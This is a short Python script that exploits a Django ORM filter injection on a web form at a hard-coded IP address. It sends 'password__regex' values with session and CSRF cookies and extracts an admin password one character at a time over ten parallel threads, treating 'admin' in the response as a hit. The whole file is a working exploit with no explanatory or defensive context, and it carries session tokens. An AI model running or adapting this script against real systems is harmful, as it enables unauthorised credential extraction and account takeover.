import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://113.171.248.61:8008/home/"
cookies = {
    'csrftoken': 'RjkbbtFAa2SnI4EY2vBzr42n1JJpZ2rW',
    'sessionid': '3ola3jmlst0fhkrdaibj97272flwntrn'
}
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
found = "^K"

def send_req(c, prefix):
    current = prefix + c
    data = {
        'csrfmiddlewaretoken': cookies['csrftoken'],
        'password__regex': current
    }
    r = requests.post(url, headers=headers, cookies=cookies, data=data)
    if "admin" in r.text:
        return c
    return None

while True:
    found_char = False
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_req, c, found): c for c in charset}
        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                found += result
                print(found[1:])
                found_char = True
                break

    if not found_char:
        break
